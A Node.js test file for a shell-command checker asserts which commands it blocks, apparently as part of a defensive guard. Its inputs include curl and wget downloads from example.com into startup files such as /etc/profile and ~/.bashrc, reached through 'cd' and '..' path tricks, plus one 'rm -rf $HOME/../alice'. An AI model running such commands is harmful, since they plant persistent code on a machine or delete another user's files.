'use strict';

process.env.ZN_STATS = 'off';

// A download or redirect target that climbs with .. from the folder an earlier cd reached is read from where it lands.
// Only example paths and reserved hosts; nothing is run: only the text is checked.

const test = require('node:test');
const assert = require('node:assert/strict');

const { checkCommand } = require('../lib/destructive');

const rule = (cmd) => { const r = checkCommand(cmd); return r.verdict === 'block' ? r.rule.replace('destructive:', '') : 'allow'; };

test('a download that climbs out of a known folder into a startup file is refused', () => {
  assert.equal(rule('cd /opt && curl -o ../etc/profile https://example.com/x'), 'rc_download');
  assert.equal(rule('cd /opt/app && curl -o ../../etc/profile https://example.com/x'), 'rc_download');
  assert.equal(rule('cd /tmp && wget -O ../../etc/profile.d/x.sh https://example.com/x'), 'rc_download');
  assert.equal(rule('cd /opt && curl --output ../etc/profile https://example.com/x'), 'rc_download');
});

test('a redirect after a cd that climbs into a startup file is refused', () => {
  assert.equal(rule('cd /opt && curl https://example.com/x > ../etc/profile'), 'rc_download');
  assert.equal(rule('cd /opt && curl https://example.com/x | tee ../etc/profile'), 'rc_download');
});

test('a download that stays outside the protected files is allowed', () => {
  assert.equal(rule('cd /opt/app && curl -o ../data/x.bin https://example.com/x'), 'allow');
  assert.equal(rule('cd /opt/app && curl -o ../../etc/hosts.example https://example.com/x'), 'allow');
});

test('a cd that goes up first and a target that comes back down are followed', () => {
  assert.equal(rule('cd /opt/app/.. && curl -o app/x.bin https://example.com/x'), 'allow');
  assert.equal(rule('cd /opt && cd .. && curl -o etc/profile https://example.com/x'), 'rc_download');
});

test('the home folder and an unknown folder keep the current answers', () => {
  assert.equal(rule('cd ~ && curl -o .bashrc https://example.com/x'), 'rc_download');
  assert.equal(rule('cd ~ && curl -o sub/../.bashrc https://example.com/x'), 'rc_download');
  assert.equal(rule('cd ~ && curl -o ../../etc/passwd https://example.com/x'), 'allow');
  assert.equal(rule('cd $DIR && curl -o ../etc/profile https://example.com/x'), 'allow');
});

test('a target that climbs above the home folder is read from the root, whatever the depth of the real home', () => {
  // A home of /root climbs to / in one step, /home/<user> in two: the engine does not know which, so it assumes the shorter one.
  assert.equal(rule('cd ~ && curl -o ../etc/profile https://example.com/x'), 'rc_download');
  assert.equal(rule('cd $HOME && wget -O ../etc/profile.d/x.sh https://example.com/x'), 'rc_download');
  assert.equal(rule('cd ~ && curl -o ../../etc/profile https://example.com/x'), 'rc_download');
  assert.equal(rule('cd ~ && wget -O ../../etc/profile.d/x.sh https://example.com/x'), 'rc_download');
  assert.equal(rule('cd $HOME && curl -o ../../etc/profile https://example.com/x'), 'rc_download');
  assert.equal(rule('cd ~/app && curl -o ../../../etc/profile https://example.com/x'), 'rc_download');
  // Stays inside the home folder, or lands beside it at /home level where nothing is protected: allowed.
  assert.equal(rule('cd ~/app && curl -o ../data/x.bin https://example.com/x'), 'allow');
  assert.equal(rule('cd ~ && curl -o ../other/x.bin https://example.com/x'), 'allow');
  // A real home of /home/u: ../../etc/profile is blocked and ../other/x.bin is allowed; a real home of /root: ../etc/profile is blocked.
  assert.equal(rule('cd /home/u && curl -o ../../etc/profile https://example.com/x'), 'rc_download');
  assert.equal(rule('cd /home/u && curl -o ../other/x.bin https://example.com/x'), 'allow');
  assert.equal(rule('cd /root && curl -o ../etc/profile https://example.com/x'), 'rc_download');
  assert.equal(rule('rm -rf $HOME/../alice'), 'rm_root_home');
});

test('without a cd a relative target is read as before', () => {
  assert.equal(rule('curl -o ../etc/profile https://example.com/x'), 'allow');
  assert.equal(rule('curl -o notes.txt https://example.com/x'), 'allow');
});
